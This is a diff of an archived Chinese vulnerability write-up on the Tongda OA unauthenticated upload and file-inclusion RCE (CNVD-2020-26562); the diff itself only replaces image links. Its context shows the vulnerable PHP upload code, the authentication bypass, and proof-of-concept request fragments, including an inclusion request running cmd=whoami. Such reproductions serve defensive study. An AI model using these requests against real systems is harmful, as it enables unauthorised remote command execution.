@@ -56,9 +56,9 @@ schema_version: "1"
 
   
 
-![](https://mmbiz.qpic.cn/mmbiz_png/siayVELeBkzWBXV8e57JJ4OyQuuMXTfadZCia0bN2sFBfdbTRlFx0S97kyKKjic5v6eaZ8cY4WQt0UEu4dkyowHYg/640?wx_fmt=png)
+![](../../.resource/remote/e4700f2588a58a9047e7224194a9c77ff109b7d1c2764141d4fe795b98f4e2d8.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rl6daM2XiabyLSr7nSTyAzcoZqPAsfe5tOOrXX0aciaVAfibHeQk5NOfQTdESRsezCwstPF02LeE4RHaH6NBEB9Rw/640?wx_fmt=png)
+![](../../.resource/remote/af46b8914a59a6fd7ea711f37ab78ee50b3eb2f64f79fd083b21bf24ed4e3896.png)
 
 作者：掌控安全 - master
 
@@ -76,7 +76,7 @@ CNVD:CNVD-2020-26562
 攻击者可在未授权的情况下可上传图片木马文件，之后通过精心构造的请求进行文件包含，实现远程命令执行，且攻击者无须登陆认证即可完成攻击。
 
   
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5N23rNnULamWT6qXEZfCsnpbjwEEBujWS9fYYDmLgCAdupxYjPYV1CyA/640?wx_fmt=jpeg)  
+![](../../.resource/remote/ec138c082c62e1cb635fbff0465f4c8949e487658115fd407cc0f97c51c2e598.jpg)  
   
 
 本文主要以通达 OA 文件上传和文件包含导致的 RCE 进行复现和分析
@@ -84,7 +84,7 @@ CNVD:CNVD-2020-26562
 通过 fofa 的搜索可以看到通达 OA 系统应用非常广泛, 这就给同学们提供了大量的实战环境. 当然大家一定要做一个正直的白帽子.
 
   
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NhypPL8YNh522Flpx3oWXB3L5AfzjIwU3fiaYMAhI0ibPR4rTrWYmChicQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/555ad5ed8f8a754f29bf69bbcbaf66dead569aa3adf576c95df9434830fb115a.jpg)
 
 0x01 影响范围
 ---------
@@ -107,7 +107,7 @@ CNVD:CNVD-2020-26562
 
 通达 OA 系统采用了一键式的傻瓜操作, 正常的软件安装, 这里我本地搭建的. 安装过程省略. 安装完成后访问本地地址, 截图如下:  
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NChNAOibFmocz41yvMXASe18g2mzt63qUUiaQRU76ZLnbvkISBQlhFIqQ/640?wx_fmt=jpeg)  
+![](../../.resource/remote/21cac34d1e1267f25b920c983c7dd79d9766211e5c6a7cd5343f920b7b14340e.jpg)  
 
 0x03 未授权上传文件
 ------------
@@ -125,7 +125,7 @@ CNVD:CNVD-2020-26562
 所以这里只需要传递一个 P 并且值不为空，就可以绕过登录认证，在未授权的情况下进行上传文件。
 
   
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5N8bzlcPPPAcOtxMuxZuTmPlgLILHicoUuibQ0UahOsKibow9H4ibfI2rgQg/640?wx_fmt=jpeg)  
+![](../../.resource/remote/661e9c42f23b2539798e14bc405783a1ade07cefe06aa28f63c74aa008ae5c06.jpg)  
   
 
 这里测试的包中传递了 P 参数
@@ -133,7 +133,7 @@ CNVD:CNVD-2020-26562
 接着往下看
 
   
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NdunXW9Yuld8Iuhq1fp1MGFCqgEicYSGuq4Bomy0oWticMR0dP6ic6jpPw/640?wx_fmt=png)  
+![](../../.resource/remote/0290942e3315b1ad719badb544dc5e3d4cf594a82244f1d48041c2889ff478a1.png)  
   
 
 判断 DEST_UID, 只要不为空也不为 0 即可， 在之后的文件上传处理逻辑代码中，
@@ -150,7 +150,7 @@ CNVD:CNVD-2020-26562
 function upload($PREFIX = 'ATTACHMENT', $MODULE = '', $OUTPUT = <br style="overflow-wrap: break-word !important;">true)<br style="overflow-wrap: break-word !important;">{<br style="overflow-wrap: break-word !important;"> if (strstr($MODULE, '/') || strstr($MODULE, '\\')) {<br style="overflow-wrap: break-word !important;"> if (!$OUTPUT) {<br style="overflow-wrap: break-word !important;"> return _('参数含有非法字符。');<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> Message(_('错误'), _('参数含有非法字符。'));<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $ATTACHMENTS = array('ID' => '', 'NAME' => '');<br style="overflow-wrap: break-word !important;"> reset($_FILES);<br style="overflow-wrap: break-word !important;"> foreach ($_FILES as $KEY => $ATTACHMENT) {<br style="overflow-wrap: break-word !important;"> if ($ATTACHMENT['error'] == 4 || $KEY != $PREFIX && <br style="overflow-wrap: break-word !important;"> substr($KEY, 0, strlen($PREFIX) + 1) != $PREFIX . '_') <br style="overflow-wrap: break-word !important;"> {<br style="overflow-wrap: break-word !important;"> continue;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $data_charset = isset($_GET['data_charset']) ?<br style="overflow-wrap: break-word !important;"> $_GET['data_charset'] : (isset($_POST['data_charset'])?<br style="overflow-wrap: break-word !important;"> $_POST['data_charset'] : '');<br style="overflow-wrap: break-word !important;"> $ATTACH_NAME = $data_charset != ''? <br style="overflow-wrap: break-word !important;"> td_iconv($ATTACHMENT['name'], $data_charset, <br style="overflow-wrap: break-word !important;"> MYOA_CHARSET) : $ATTACHMENT['name'];<br style="overflow-wrap: break-word !important;"> $ATTACH_SIZE = $ATTACHMENT['size'];<br style="overflow-wrap: break-word !important;"> $ATTACH_ERROR = $ATTACHMENT['error'];<br style="overflow-wrap: break-word !important;"> $ATTACH_FILE = $ATTACHMENT['tmp_name'];<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = '';<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == UPLOAD_ERR_OK) {<br style="overflow-wrap: break-word !important;"> if (!is_uploadable($ATTACH_NAME)) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('禁止上传后缀名为[%s]的文<br style="overflow-wrap: break-word !important;"> 件'), substr($ATTACH_NAME, <br style="overflow-wrap: break-word !important;"> strrpos($ATTACH_NAME, '.') + 1));<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> $encode = mb_detect_encoding($ATTACH_NAME, <br style="overflow-wrap: break-word !important;"> array('ASCII', 'UTF-8', 'GB2312', 'GBK', 'BIG5'));<br style="overflow-wrap: break-word !important;"> if ($encode != 'UTF-8') {<br style="overflow-wrap: break-word !important;"> $ATTACH_NAME_UTF8 = <br style="overflow-wrap: break-word !important;"> mb_convert_encoding($ATTACH_NAME, 'utf-8', <br style="overflow-wrap: break-word !important;"> MYOA_CHARSET);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> $ATTACH_NAME_UTF8 = $ATTACH_NAME;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if (preg_match('/[\\\':<>?]|\\/|\\\\|"|\\|/u', <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME_UTF8)) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件名[%s]包含<br style="overflow-wrap: break-word !important;"> [/\\\'":*?<>|]等非法字符'), $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if ($ATTACH_SIZE == 0) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]大小为0字节'), <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if ($ERROR_DESC == '') {<br style="overflow-wrap: break-word !important;"> $ATTACH_NAME = str_replace('\'', '', <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> $ATTACH_ID = add_attach($ATTACH_FILE, <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME, $MODULE);<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ID === false) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]上传失败'), <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> $ATTACHMENTS['ID'] .= $ATTACH_ID . ',';<br style="overflow-wrap: break-word !important;"> $ATTACHMENTS['NAME'] .= $ATTACH_NAME . '*';<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> @unlink($ATTACH_FILE);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]的大小超过了系统<br style="overflow-wrap: break-word !important;"> 限制<br style="overflow-wrap: break-word !important;">（%s）'), $ATTACH_NAME, ini_get('upload_max_filesize'));<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]的大小超过<br style="overflow-wrap: break-word !important;"> 了表<br style="overflow-wrap: break-word !important;">单限制'), $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]上传不<br style="overflow-wrap: break-word !important;"> 完整'), $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == <br style="overflow-wrap: break-word !important;"> UPLOAD_ERR_NO_TMP_DIR) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件[%s]上<br style="overflow-wrap: break-word !important;"> 传失败：找不到临时文件夹'), <br style="overflow-wrap: break-word !important;"> $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> if ($ATTACH_ERROR == U<br style="overflow-wrap: break-word !important;"> PLOAD_ERR_CANT_WRITE) {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('文件<br style="overflow-wrap: break-word !important;"> [%s]写入失败'), $ATTACH_NAME);<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> $ERROR_DESC = sprintf(_('未知错<br style="overflow-wrap: break-word !important;"> 误[代码：%s]'), $ATTACH_ERROR);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if ($ERROR_DESC != '') {<br style="overflow-wrap: break-word !important;"> if (!$OUTPUT) {<br style="overflow-wrap: break-word !important;"> delete_attach($ATTACHMENTS['ID'], <br style="overflow-wrap: break-word !important;"> $ATTACHMENTS['NAME'], $MODULE);<br style="overflow-wrap: break-word !important;"> return $ERROR_DESC;<br style="overflow-wrap: break-word !important;"> } else {<br style="overflow-wrap: break-word !important;"> Message(_('错误'), $ERROR_DESC);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> return $ATTACHMENTS;<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5N3nYaibnzXsvvDrzFhBUT3SeuZBY1myNKuH4t4kWmhicIIuAPfwcbEKzA/640?wx_fmt=png)
+![](../../.resource/remote/f18aae191525f858d170ac9aea2ce4d18aa1ab7f6597a9fad0bf1ce9424cdc60.png)
 
 这里调用了 is_uploadable 对文件名字进行判断, 这个函数在 1833 行
 
@@ -161,7 +161,7 @@ function is_uploadable($FILE_NAME)<br style="overflow-wrap: break-word !importan
 首先使用了 strrpos 来定位 . 最后出现的位置
 
   
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NaiaibxH5N8SzahxofeCKqDcLLtgqHHsvtl6sGYhjwP3nKyZp73pKN4pg/640?wx_fmt=jpeg)  
+![](../../.resource/remote/60d8200cce6ff55ce8ffa3f51054fe5a5c5c5a6e08e69adc1c3816fee8ddba9f.jpg)  
   
 
 当文件名中不存在”.” 时会直接以现有的文件名来作为 EXT_NAME,
@@ -190,7 +190,7 @@ function is_uploadable($FILE_NAME)<br style="overflow-wrap: break-word !importan
 这里首先是不传入参数 P 就可以进入下面判断语句，之后用到了 stripcslashes 函数
 
   
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NIPVpejqyBPysTIhwgl4ThMxEIV12jvqJVYs96uiaryX0ldZEp8b6q5Q/640?wx_fmt=jpeg)  
+![](../../.resource/remote/8bd33311f01496b179ad737b148ef5fe57103a81304072d24335cc6dd36660c6.jpg)  
 看一下实例就明白了，只是这里的源码接收了一个形参
 
 之后从 json 中获取 url 参数的值，之后判断 general/、ispirit/、module / 是否在 url 内
@@ -212,13 +212,13 @@ function is_uploadable($FILE_NAME)<br style="overflow-wrap: break-word !importan
 1. 访问本地通达 OA 系统
 
   
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NChNAOibFmocz41yvMXASe18g2mzt63qUUiaQRU76ZLnbvkISBQlhFIqQ/640?wx_fmt=jpeg)  
+![](../../.resource/remote/21cac34d1e1267f25b920c983c7dd79d9766211e5c6a7cd5343f920b7b14340e.jpg)  
   
 
 2. 抓包，改 POST 包，放入 Repeater 模块。
 
   
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NKoxgwRrpYkGJUnSjv4mH0UAa3BlmTJbjGrDTtWA8afNicl5MqCyBic7A/640?wx_fmt=jpeg)  
+![](../../.resource/remote/4fdc4efe8d19b329f369294b23cad8ea04bd5050ed794892b7c8b4b805ee6e25.jpg)  
   
 
 3. 改包，如下 POC
@@ -231,7 +231,7 @@ POST /ispirit/im/upload.php HTTP/1.1<br style="overflow-wrap: break-word !import
 
 我们单包发送会在通达 OA 系统的文件中生成木马 php 文件。  
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NcCXNg39Omcf9bmwgS3VYOTC9XDqxVvqnOUFY6iaXPqL2YdutkJD2htw/640?wx_fmt=jpeg)  
+![](../../.resource/remote/d651ea0e95e12831b0f8fe48679c779caa7fecd3a939600ef29d2b98850e628f.jpg)  
   
 
 很明显的可以看到，上传成功了，接下来利用文件包含执行上传的木马文件  
@@ -250,14 +250,14 @@ json={"url":"/general/../../attach/im/2005/1151884360.123.php"}&cmd=whoami
 查看返回包（这里一定要发 POST 包）
 
   
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NdKpo7odIhMqC6V8esUKUenQvCPPkxd3dtrnjhyDaR8cbcqq3I0iacqg/640?wx_fmt=jpeg)  
+![](../../.resource/remote/962b43aaf63d03a6b95fadd807bb3f66c5723c111660537d27fadc12442020ea.jpg)  
   
 
 system 权限
 
 执行一下 CMD 命令看一下
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5Nn8mSOpqMCW4FoyByeBIqHVoiaWOru7dCTZaiaf1odTlqKGibU9UFs0hicQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/80bc9be6e041130514bfd374e49485b57d54d31f22fc53c1d46e466ffd1322f3.jpg)
 
 0x07 总结
 -------
@@ -289,13 +289,13 @@ system 权限
 [实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)
+![](../../.resource/remote/553ceefc3b1479cc862f6f8900857ffa3da4352fd66ccb41e13c9b73baff07fa.gif)
 
 扫码白嫖视频 + 工具 + 进群 + 靶场等资料
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)
+![](../../.resource/remote/cfe2acf01f76856e34009a3a3c80c59c96367595d7f9dcf72cf3031cd3ac7641.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)
+![](../../.resource/remote/cc23fa1d3e8157e15633c47bc376e29fa74b67c7beeba492c693ff51db3d83c5.png)
 
  **扫码白嫖****！**
 
